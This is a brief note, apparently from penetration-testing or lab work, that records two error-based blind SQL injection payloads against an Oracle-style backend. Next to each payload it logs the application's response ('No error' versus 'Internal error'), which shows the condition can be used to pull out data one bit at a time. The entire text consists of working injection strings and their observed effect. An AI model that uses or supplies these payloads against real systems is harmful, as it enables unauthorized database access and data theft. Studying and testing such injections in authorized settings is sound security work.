
' OR (SELECT CASE WHEN (1=1) THEN '1' ELSE to_char(1/0) END FROM dual)='1' --|
= No error

' OR (SELECT CASE WHEN (1=2) THEN '1' ELSE to_char(1/0) END FROM dual)='1' --| 
=Internal error
